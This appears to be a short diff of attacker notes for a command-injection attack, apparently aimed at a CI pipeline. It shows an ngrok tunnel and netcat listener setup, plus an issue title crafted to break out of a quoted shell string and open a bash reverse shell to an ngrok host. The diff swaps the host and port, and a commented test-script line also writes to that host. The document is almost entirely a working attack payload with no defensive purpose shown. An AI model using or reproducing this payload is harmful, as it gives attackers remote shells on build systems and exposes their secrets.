@@ -1,7 +1,7 @@
 ngrok tcp 1000
 sudo nc -lvk 1000
 
-New malicious issue title" && bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/13524 0>&1 && echo "
+New malicious issue title" && bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/10129 0>&1 && echo "
 
 runtests.sh:
 #echo "Execution from READ user" > /dev/tcp/7.tcp.eu.ngrok.io/13524
